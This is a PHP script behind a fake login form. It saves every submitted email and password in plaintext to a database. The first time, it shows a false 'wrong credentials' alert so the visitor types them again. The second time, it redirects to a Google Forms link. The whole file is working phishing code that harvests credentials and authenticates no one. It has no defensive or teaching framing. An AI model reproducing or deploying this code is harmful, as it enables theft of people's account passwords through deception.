<?php
// Database configuration
$servername = "";
$port = "";
$username = "";
$password = "";
$dbname = "";

// Create a connection
$conn = new mysqli($servername, $username, $password, $dbname, $port);

// Check the connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Start a session to track attempts
session_start();

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get email and password from the form
    $email = $conn->real_escape_string($_POST['email']);
    $password = $conn->real_escape_string($_POST['password']);

    // Insert the input into the database
    $sql = "INSERT INTO users (email, password) VALUES ('$email', '$password')";
    if ($conn->query($sql) !== TRUE) {
        echo "Error: " . $sql . "<br>" . $conn->error;
        exit();
    }

    // Track login attempts
    if (!isset($_SESSION['login_attempts'])) {
        $_SESSION['login_attempts'] = 0; // Initialize the counter
    }

    $_SESSION['login_attempts']++;

    if ($_SESSION['login_attempts'] == 1) {
        // First login attempt: Display an error message
        echo "<script>
            alert('Please enter a correct email address and password. Note that both fields may be case-sensitive.');
            window.history.back();
        </script>";
    } elseif ($_SESSION['login_attempts'] > 1) {
        // Second login attempt: Redirect the user
        header("Location: https://forms.gle/AinbbU9CX8mJot8H8");
        exit();
    }
}

// Close the connection
$conn->close();
?>
